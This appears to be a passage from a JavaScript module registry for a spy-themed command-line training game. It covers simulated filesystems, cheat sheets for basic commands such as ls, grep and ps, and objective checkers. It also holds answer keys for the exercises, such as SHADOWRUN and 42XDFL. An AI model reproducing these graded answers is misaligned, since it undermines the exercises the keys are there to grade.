/**
 * CLHConfig.js - Command Line Hacker Module Configuration Registry
 * Hexworth Prime - House of Script
 *
 * Central registry for all CLH course modules.
 * Each module defines its filesystem overlay, objectives, and metadata.
 *
 * Usage:
 *   const config = CLHConfig.getModule('CLH-002');
 *
 * Version: 1.0.0
 * Created: January 17, 2026
 */

const CLHConfig = (function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════════
    // TIER DEFINITIONS
    // ═══════════════════════════════════════════════════════════════

    const TIERS = {
        'CLI Recruit': {
            modules: ['CLH-001', 'CLH-002', 'CLH-003'],
            badge: 'cli-recruit',
            description: 'Basic command line navigation'
        },
        'CLI Analyst': {
            modules: ['CLH-004', 'CLH-005', 'CLH-006'],
            badge: 'cli-analyst',
            description: 'Process and log analysis'
        },
        'CLI Operative': {
            modules: ['CLH-007', 'CLH-008', 'CLH-009'],
            badge: 'cli-operative',
            description: 'Permissions and scripting'
        },
        'CLI Shadow': {
            modules: ['CLH-010', 'CLH-011', 'CLH-012'],
            badge: 'cli-shadow',
            description: 'Network operations'
        },
        'CLI Phantom': {
            modules: ['CLH-013', 'CLH-014', 'CLH-015'],
            badge: 'cli-phantom',
            description: 'Advanced operations'
        },
        'CLI Specter': {
            modules: ['CLH-016', 'CLH-017', 'CLH-018', 'CLH-019', 'CLH-020', 'CLH-021', 'CLH-022'],
            badge: 'cli-specter',
            description: 'System reconnaissance and infiltration'
        },
        'CLI Wraith': {
            modules: ['CLH-023', 'CLH-024', 'CLH-025', 'CLH-026', 'CLH-027'],
            badge: 'cli-wraith',
            description: 'Persistence and privilege escalation'
        },
        'CLI Ghost': {
            modules: ['CLH-028', 'CLH-029', 'CLH-030'],
            badge: 'cli-ghost',
            description: 'Elite field operations'
        }
    };

    // ═══════════════════════════════════════════════════════════════
    // MODULE REGISTRY
    // ═══════════════════════════════════════════════════════════════

    const MODULES = {

        // ──────────────────────────────────────────────────────────
        // CLH-001: Introduction to the Command Line Interface
        // Theme: First contact with the hacker terminal
        // ──────────────────────────────────────────────────────────
        'CLH-001': {
            title: 'Introduction to Hacker CLI',
            description: 'Welcome to Command Line Hacker training. Learn basic reconnaissance commands.',
            prerequisites: [],  // No prerequisites - entry point
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,  // All commands allowed

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['Documents', 'missions', 'scripts', 'tools', '.bashrc', '.bash_history', '.classified', '.cli_cheatsheet']
                },
                '/home/operator/Documents': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: []
                },
                '/home/operator/missions': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'targets.txt', 'handler_notes.txt']
                },
                '/home/operator/missions/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `OPERATION: SILENT ECHO
Classification: TOP SECRET // NOFORN

Welcome to Command Line Hacker training, operative.

Your mission: Master the terminal interface. The command line
is your primary weapon in the field. GUI tools leave traces.
The terminal leaves only what you choose.

Complete all training modules to be assigned to active operations.

Handler: GHOSTWRITER
Comms Window: 0300-0500 UTC

"In the shadows, we type. In silence, we execute."
`
                },
                '/home/operator/missions/targets.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `[CLASSIFIED - LEVEL 4 CLEARANCE REQUIRED]

Target List - PENDING AUTHORIZATION

Complete CLI training modules 001-005 to unlock.

Current clearance: TRAINEE
Required clearance: ANALYST
`
                },
                '/home/operator/missions/handler_notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 289,
                    content: `HANDLER NOTES - For Trainee Eyes Only

Basic commands every operative must know:
- whoami: Verify your identity
- pwd: Know your position
- hostname: Identify the system
- ls: Survey your environment
- cd: Move through the filesystem
- cat: Read file contents

Start with reconnaissance. Always.
`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['recon.sh', 'exfil.sh']
                },
                '/home/operator/scripts/recon.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 198,
                    content: `#!/bin/bash
# RECON.SH - Basic reconnaissance script
# Author: GHOSTWRITER
# Classification: UNCLASSIFIED

echo "[*] Initiating recon..."
whoami
hostname
pwd
ls -la
echo "[*] Recon complete."
`
                },
                '/home/operator/scripts/exfil.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 87,
                    content: `#!/bin/bash
# EXFIL.SH - Data exfiltration template
# [REDACTED - Complete training to unlock]
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['nmap_results.txt']
                },
                '/home/operator/tools/nmap_results.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Nmap scan results - Training Lab
# Target: 10.0.0.0/24

Host: 10.0.0.1 (gateway)
  22/tcp   open  ssh
  80/tcp   open  http

Host: 10.0.0.42 (shadow)
  22/tcp   open  ssh
  3306/tcp open  mysql

[Scan truncated for training]
`
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `# Operator shell config
export PS1="\\u@\\h:\\w\\$ "
alias ll='ls -la'
alias cls='clear'

# "The best hackers leave no trace."
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `whoami
pwd
hostname
ls
cat missions/handler_notes.txt
`
                },
                '/home/operator/.classified': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 201,
                    content: `ASSET CODENAMES - MEMORIZE AND DELETE

MOCKINGBIRD - Media contact (compromised)
RAVEN - Field operative, Berlin
PHOENIX - Extraction specialist
GHOST - You

Handler dead drop: 40.7128° N, 74.0060° W
Phrase: "The weather is nice in Prague"
`
                },
                '/home/operator/.cli_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `CLI BASICS - OPERATOR CHEATSHEET
==================================

IDENTITY & POSITION
  whoami          Show current username
  pwd             Print working directory (where you are)
  hostname        Show system hostname

RECONNAISSANCE
  ls              List directory contents
  ls -l           Long format (permissions, size, date)
  ls -a           Show hidden files (starting with .)
  ls -la          Both: long format + hidden files

NAVIGATION
  cd <dir>        Change to directory
  cd ..           Go up one level
  cd ~            Go to home directory
  cd              Same as cd ~ (go home)

FILE READING
  cat <file>      Display entire file contents
  head <file>     Show first 10 lines
  tail <file>     Show last 10 lines

PRO TIP: Hidden files start with a dot (.)
         Use ls -a to reveal them.

"First rule of reconnaissance: Know where you are."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Identify Operator',
                    hint: 'Identify your current user account: whoami',
                    check: (cmd, state, output) => cmd.trim() === 'whoami' &&
                        output && output.includes('operator')
                },
                {
                    id: 2,
                    task: 'RECON: Locate Position',
                    hint: 'Determine your filesystem position: pwd',
                    check: (cmd, state, output) => cmd.trim() === 'pwd' &&
                        output && output.includes('/home')
                },
                {
                    id: 3,
                    task: 'RECON: Identify Target System',
                    hint: 'Identify the hostname: hostname',
                    check: (cmd, state, output) => cmd.trim() === 'hostname' &&
                        output && output.includes('shadow')
                },
                {
                    id: 4,
                    task: 'SURVEY: Assess Environment',
                    hint: 'Survey your surroundings: ls',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('missions') || output.includes('Documents'))
                },
                {
                    id: 5,
                    task: 'EXTRACT: Read Intel',
                    hint: 'Read the handler notes: cat missions/handler_notes.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('handler') &&
                        output && output.includes('whoami')
                },
            ],

            remoteHosts: null,  // No SSH targets in intro module
        },

        // ──────────────────────────────────────────────────────────
        // CLH-002: Navigation & Reconnaissance
        // Theme: Field operations reconnaissance mission
        // ──────────────────────────────────────────────────────────
        'CLH-002': {
            title: 'Navigation & Reconnaissance',
            description: 'Navigate the filesystem like a ghost. Map the territory and extract critical intel.',
            prerequisites: ['CLH-001'],
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                // Home directory structure
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['Documents', 'intel', 'scripts', 'logs', '.bash_history', '.bashrc', '.navigation_cheatsheet']
                },
                '/home/operator/Documents': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['notes.txt']
                },
                '/home/operator/Documents/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 40,
                    content: 'Meeting at 14:00 in the secure room.\n'
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'targets.txt', '.secret.txt', '.classified']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `CLASSIFIED BRIEFING - OPERATION SHADOW
========================================

Mission: Establish secure access to target network
Status: ACTIVE

PRIMARY OBJECTIVES:
1. Map filesystem structure
2. Locate intel directories
3. Extract mission-critical data
4. Return to base undetected

Handler: PHOENIX
Clearance: LEVEL 3

Remember: Leave no trace.
`
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `TARGET LIST
============
- Alpha Server (192.168.1.10)
- Beta Database (192.168.1.20)
- Gamma Comms (192.168.1.30)

Priority: HIGH
`
                },
                '/home/operator/intel/.secret.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: 'The password to the vault is: SHADOWRUN\n'
                },
                '/home/operator/intel/.classified': {
                    type: 'dir',
                    perms: 'drwx------',
                    owner: 'operator',
                    group: 'operator',
                    children: ['eyes-only.txt']
                },
                '/home/operator/intel/.classified/eyes-only.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `TOP SECRET - EYES ONLY

Project LOOKING GLASS is compromised.
Trust no one from Division 7.

Coordinates: 47.6062° N, 122.3321° W
`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['backup.sh', 'scan.sh']
                },
                '/home/operator/scripts/backup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 45,
                    content: '#!/bin/bash\ncp -r ~/intel ~/intel.bak\n'
                },
                '/home/operator/scripts/scan.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 38,
                    content: '#!/bin/bash\nls -la ~/intel\n'
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log']
                },
                '/home/operator/logs/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 78,
                    content: '2024-01-15 08:23:11 - User login: operator\n2024-01-15 08:24:03 - Directory accessed: /intel\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 35,
                    content: `ls
cd intel
ls -la
cat briefing.txt
cd .classified
cat eyes-only.txt
cd ~
`
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 24,
                    content: '# Operator shell config\n'
                },
                '/home/operator/.navigation_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `NAVIGATION - OPERATOR CHEATSHEET
==================================

MOVEMENT COMMANDS
  cd <dir>        Change to directory
  cd ..           Go up one directory
  cd ~            Go to home directory
  cd -            Go to previous directory
  cd              Same as cd ~ (go home)

RECONNAISSANCE
  ls              List directory contents
  ls -l           Long format (details)
  ls -a           Show hidden files (starting with .)
  ls -la          Both: details + hidden files
  ls -lah         Human-readable file sizes

PATH TYPES
  ./file          Relative path (current directory)
  ../file         Relative path (parent directory)
  ~/file          Home directory path
  /path/to/file   Absolute path (from root)

HIDDEN CONTENT
  - Files starting with . are hidden
  - Use ls -a to reveal them
  - Hidden directories can contain classified intel

PRO TIP: Good operatives always check for hidden files.
         The best intel is often in .secret locations.

"Move like a ghost. Leave no trace."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: Map the Territory',
                    hint: 'Use ls to survey your current location',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('intel') || output.includes('Documents'))
                },
                {
                    id: 2,
                    task: 'INFILTRATE: Enter Intel Directory',
                    hint: 'Navigate into the "intel" directory: cd intel',
                    check: (cmd, state) => state.currentDir.includes('intel')
                },
                {
                    id: 3,
                    task: 'SCAN: Deep Reconnaissance',
                    hint: 'Reveal hidden files with: ls -la',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-') &&
                        (cmd.includes('l') && cmd.includes('a')) &&
                        output && (output.includes('.secret') || output.includes('.classified'))
                },
                {
                    id: 4,
                    task: 'EXTRACT: Read the Briefing',
                    hint: 'Access the briefing.txt file: cat briefing.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('briefing') &&
                        output && output.includes('OPERATION SHADOW')
                },
                {
                    id: 5,
                    task: 'EXFIL: Return to Base',
                    hint: 'Navigate back to home: cd ~ (or cd)',
                    check: (cmd, state) => state.currentDir === '/home/operator'
                },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the password to the vault?",
                acceptedAnswers: ["SHADOWRUN", "shadowrun", "Shadowrun"],
                hint: "Look for hidden files in the intel directory. Secrets hide in the shadows.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Access denied. Search deeper - some files are hidden from plain sight.",
                correctAnswerMessage: "Vault access granted: SHADOWRUN confirmed. You found the hidden intelligence."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-003: Pattern Hunting
        // Theme: UFO incident report with hidden secret code
        // ──────────────────────────────────────────────────────────
        'CLH-003': {
            title: 'Pattern Hunting',
            description: 'Use grep to find needles in haystacks. A secret code is hidden in the evidence.',
            prerequisites: ['CLH-002'],
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,
            secretCode: '42XDFL',  // Secret code to find

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['evidence', 'tools', 'reports', '.bash_history', '.grep_cheatsheet']
                },
                '/home/operator/evidence': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mystery.txt', 'notes.txt', 'README.txt', 'witness_reports.txt', 'timeline.txt']
                },
                '/home/operator/evidence/mystery.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 2048,
                    content: `CLASSIFIED INCIDENT REPORT - CASE FILE #2847
============================================
Date: November 12, 2025
Location: Rural Nevada, 37.2431N 115.7930W
Reporting Agent: Field Officer Martinez

SUMMARY OF EVENTS:
At approximately 0247 hours, multiple witnesses reported unusual
aerial phenomena near the restricted airspace perimeter. Radar
contact confirmed an unidentified craft traveling at impossible
speeds - estimated 4,700 knots with instantaneous direction changes.

WITNESS TESTIMONY (REDACTED):
"The light just appeared out of nowhere. It wasn't like a plane
or helicopter. It moved in ways that don't make sense. Then it
just stopped, hovering maybe 200 feet above the treeline."

ABDUCTION INCIDENT:
Subject: [REDACTED] - Local rancher, age 47
Duration: Approximately 3 hours 17 minutes of missing time
Subject reports: Paralysis, bright examination room, non-human
entities approximately 4 feet tall with elongated craniums.
Medical examination revealed unexplained scarring and elevated
radiation levels. Subject's GPS tracker data shows impossible
location jump of 127 miles during the missing time window.

PHYSICAL EVIDENCE RECOVERED:
- Soil samples show vitrification consistent with extreme heat
- Unusual metallic fragments (analysis pending)
- Cattle mutilation discovered 0.3 miles from primary site
Secret Code: 42XDFL
SIGNAL INTERCEPT:
NSA listening post captured burst transmission during event.
Frequency: 1420.405 MHz (hydrogen line - significant)
Pattern analysis suggests non-random, possibly encoded message.

CONCLUSION:
This incident is classified TIER-3 UNEXPLAINED. All witnesses
have been debriefed and signed non-disclosure agreements.
Local law enforcement redirected with cover story (military
training exercise). Recommend continued monitoring of subject
for potential recontact scenario.

END REPORT
[EYES ONLY - UNAUTHORIZED ACCESS PROHIBITED]`
                },
                '/home/operator/evidence/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: 'Case #2847\nSuspect communications intercepted.\nEvidence stored in mystery.txt\nAnalyst notes: Look for patterns.\n'
                },
                '/home/operator/evidence/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 163,
                    content: 'EVIDENCE DIRECTORY\n==================\nFiles in this directory are part of ongoing investigation.\nUse grep to search for patterns.\nDo not modify original evidence.\n'
                },
                '/home/operator/evidence/witness_reports.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `WITNESS STATEMENTS - CASE #2847
================================

WITNESS A (Rancher):
"I was checking the cattle around 0230 when I saw the light.
It was bright, almost blinding. The cattle were spooked.
I lost about three hours - don't remember anything."

WITNESS B (Highway Patrol):
"Dispatch received multiple 911 calls about lights in the sky.
When I arrived at the location, there was nothing but a
burned patch in the field. My radio went dead for 20 minutes."

WITNESS C (Pilot):
"I was at 15,000 feet when something passed me doing
impossible maneuvers. No aircraft I know can move like that.
FAA has no record of any traffic in that sector."

All witnesses passed polygraph examination.
`
                },
                '/home/operator/evidence/timeline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `INCIDENT TIMELINE - CASE #2847
===============================
0215 - First radar contact
0230 - Witness A reports light
0235 - 911 calls begin
0247 - Peak activity recorded
0300 - Subject missing time begins
0315 - Military assets scrambled
0330 - FAA communication blackout
0400 - Object disappears from radar
0603 - Subject found confused in field
0800 - Evidence collection begins
1200 - Site secured and classified

Total duration of event: ~4 hours
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['search.sh']
                },
                '/home/operator/tools/search.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 54,
                    content: '#!/bin/bash\n# Quick search script\ngrep -rn "$1" ./evidence/\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 34,
                    content: `ls evidence/
cat evidence/mystery.txt
grep Secret evidence/mystery.txt
grep "Secret Code" evidence/mystery.txt
grep -n "Secret Code" evidence/mystery.txt
grep -i witness evidence/
`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: 'REPORTS DIRECTORY\n=================\nSave your grep output here using redirection:\ngrep "pattern" file > reports/findings.txt\n'
                },
                '/home/operator/.grep_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `GREP - PATTERN HUNTING CHEATSHEET
===================================

BASIC USAGE
  grep "pattern" file       Search for pattern in file
  grep "pattern" dir/*      Search in all files in directory

USEFUL FLAGS
  -i          Case insensitive search
  -n          Show line numbers
  -c          Count matching lines
  -v          Invert match (show non-matching)
  -r          Recursive (search subdirectories)
  -l          List only filenames with matches
  -w          Match whole words only

PATTERN EXAMPLES
  grep "error" log.txt          Find "error" in log.txt
  grep -i "secret" *.txt        Case-insensitive in all .txt
  grep -n "code" evidence/*     Show line numbers
  grep -rn "pattern" ./         Recursive with line numbers

COMBINING FLAGS
  grep -in "pattern" file       Case-insensitive + line numbers
  grep -rn "pattern" dir/       Recursive + line numbers
  grep -c "pattern" file        Just count matches

PRO TIP: Wrap patterns with spaces in quotes.
         grep "Secret Code" is different from grep Secret Code

"Find the pattern. Extract the truth."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Survey the Evidence',
                    hint: 'Examine the evidence directory: ls evidence/',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('evidence') &&
                        output && (output.includes('mystery') || output.includes('notes'))
                },
                {
                    id: 2,
                    task: 'INTEL: Examine the Target File',
                    hint: 'Preview mystery.txt: cat evidence/mystery.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('mystery') &&
                        output && output.includes('CLASSIFIED')
                },
                {
                    id: 3,
                    task: 'HUNT: Search for "Secret"',
                    hint: 'Use grep to find lines with "Secret"',
                    check: (cmd, state, output) => cmd.includes('grep') &&
                        (cmd.includes('Secret') || cmd.includes('secret')) &&
                        output && output.includes('Secret')
                },
                {
                    id: 4,
                    task: 'EXTRACT: Find the Code Pattern',
                    hint: 'Search for "Secret Code": grep "Secret Code" evidence/mystery.txt',
                    check: (cmd, state, output) => output && output.includes('42XDFL')
                },
                {
                    id: 5,
                    task: 'VERIFY: Confirm with Line Number',
                    hint: 'Document with line numbers: grep -n "Secret Code" evidence/mystery.txt',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-n') &&
                        output && /^\d+:/.test(output.trim())
                },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the secret code hidden in the evidence?",
                acceptedAnswers: ["42XDFL", "42xdfl"],
                hint: "Use grep to search for 'Secret Code' in the mystery.txt file.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Code not recognized. Search the evidence more carefully.",
                correctAnswerMessage: "Code verified: 42XDFL. Evidence extraction complete. You've mastered pattern hunting."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-004: Process Investigation
        // Theme: Black site monitoring station, threat hunting
        // ──────────────────────────────────────────────────────────
        'CLH-004': {
            title: 'Process Investigation',
            description: 'Monitor running processes. Something is always watching.',
            prerequisites: ['CLH-003'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['analysis', 'tools', 'reports', '.bash_history', '.process_cheatsheet']
                },
                '/home/operator/analysis': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['processes.txt', 'README.txt', 'baseline.txt', '.incident_log']
                },
                '/home/operator/analysis/processes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `PID     CPU%    MEM%    PROCESS
1       0.0     0.1     systemd
2       0.0     0.0     kthreadd
127     0.1     0.2     sshd
256     0.3     1.2     signal_intercept
312     0.2     0.8     postgres
445     1.2     2.1     facial_recog_daemon
512     0.1     0.3     cron
623     8.2     5.1     unknown_process
789     0.4     1.5     sat_uplink_monitor
834     0.2     0.6     redis-server
901     0.1     0.4     drone_telemetry
945     0.3     0.9     mysql
1024    0.0     0.2     comms_logger
1156    0.1     0.3     perimeter_sensor`
                },
                '/home/operator/analysis/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `BLACK SITE MONITORING STATION - INCIDENT REPORT
================================================
Facility: [REDACTED] - Codename "SHADOW MESA"
Process snapshot captured: 2024-01-15 14:32:07 UTC
Alert triggered by: Anomalous CPU usage spike
Analyst assigned: operator

SITUATION:
Perimeter breach detected 0300 hours. Unknown entity
gained access to monitoring subnet. One unauthorized
process now running on primary analysis server.

PRIORITY: CRITICAL
Find and document the rogue process before it
exfiltrates satellite telemetry data.
`
                },
                '/home/operator/analysis/baseline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `APPROVED PROCESS BASELINE - CLEARANCE LEVEL 4
==============================================
systemd, kthreadd, sshd, signal_intercept, postgres,
facial_recog_daemon, cron, sat_uplink_monitor,
redis-server, drone_telemetry, mysql, comms_logger,
perimeter_sensor

WARNING: Any process NOT in this list is potentially
hostile and should be flagged for immediate review.
`
                },
                '/home/operator/analysis/.incident_log': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `[0247] Perimeter alarm triggered - Sector 7G
[0251] Guards dispatched - found nothing
[0303] Anomalous network traffic detected
[0315] Unknown process spawned - PID 623
[0332] Process snapshot captured for analysis
[0340] You are now investigating...
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['hunt.sh']
                },
                '/home/operator/tools/hunt.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: '#!/bin/bash\n# Process hunting script\ngrep -v "^PID" "$1" | sort -k2 -rn | head -5\necho "Top 5 CPU consumers listed"\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 42,
                    content: `ls
cd analysis
cat processes.txt
cat baseline.txt
grep unknown processes.txt
grep "8.2" processes.txt
cat .incident_log
`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: 'REPORTS DIRECTORY\n=================\nDocument your findings here.\nUse redirection: grep pattern file > reports/findings.txt\n'
                },
                '/home/operator/.process_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `PROCESS INVESTIGATION - OPERATOR CHEATSHEET
=============================================

PROCESS MONITORING
  ps                 List your processes
  ps aux             List ALL processes (detailed)
  ps -ef             List ALL processes (full format)
  top                Interactive process viewer (q to quit)

PROCESS ANALYSIS
  ps aux | grep name     Find specific process
  ps aux | sort -k3 -rn  Sort by CPU (column 3)
  ps aux | sort -k4 -rn  Sort by memory (column 4)

THREAT HUNTING
  1. Get baseline of normal processes
  2. Compare current snapshot to baseline
  3. Look for unknown or suspicious names
  4. Check for high CPU/memory usage
  5. Investigate PIDs not in baseline

READING PROCESS OUTPUT
  PID   - Process ID (unique identifier)
  CPU%  - CPU usage percentage
  MEM%  - Memory usage percentage

SUSPICIOUS INDICATORS
  - Unknown process names
  - High CPU with no explanation
  - Processes not in baseline
  - Random alphanumeric names

"Trust nothing. Verify everything."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Locate Analysis Data',
                    hint: 'Survey your environment: ls',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('analysis') || output.includes('tools'))
                },
                {
                    id: 2,
                    task: 'INFILTRATE: Enter Analysis Directory',
                    hint: 'Navigate to analysis: cd analysis',
                    check: (cmd, state) => state.currentDir.includes('/analysis')
                },
                {
                    id: 3,
                    task: 'INTEL: Review Process Snapshot',
                    hint: 'Read the process list: cat processes.txt',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('processes') &&
                        output && output.includes('PID')
                },
                {
                    id: 4,
                    task: 'HUNT: Identify the Rogue Process',
                    hint: 'Search for anomalies: grep "unknown" processes.txt',
                    check: (cmd, state, output) => output && output.includes('unknown_process')
                },
                {
                    id: 5,
                    task: 'VERIFY: Confirm by CPU Usage',
                    hint: 'Verify high CPU: grep "8.2" processes.txt',
                    check: (cmd, state, output) => cmd.includes('grep') && output && output.includes('8.2')
                },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the name of the unauthorized process?",
                acceptedAnswers: ["unknown_process", "unknown process", "623"],
                hint: "Compare the process list to the baseline. What process is NOT approved?",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Process not identified. Check baseline.txt for approved processes.",
                correctAnswerMessage: "Threat confirmed: unknown_process (PID 623). Flagged for termination."
            },

            remoteHosts: null,
